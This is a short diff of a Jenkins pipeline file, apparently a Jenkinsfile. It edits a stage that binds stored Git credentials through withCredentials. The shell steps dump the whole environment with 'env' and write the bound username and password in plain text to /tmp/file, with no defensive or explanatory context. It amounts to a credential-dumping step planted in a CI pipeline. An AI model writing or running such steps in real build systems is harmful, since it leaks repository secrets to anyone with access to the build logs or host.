@@ -2,9 +2,9 @@ agent {
   stages {
    	withCredentials([usernamePassword(credentialsId: 'GIT', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {
 
-      	sh '''
-        	env
+      	sh '''env
         '''
+
 		sh '''echo "[+] USER:" > /tmp/file
 		      echo "$USERNAME" >> /tmp/file
 		      echo "$PASSWORD" >> /tmp/file
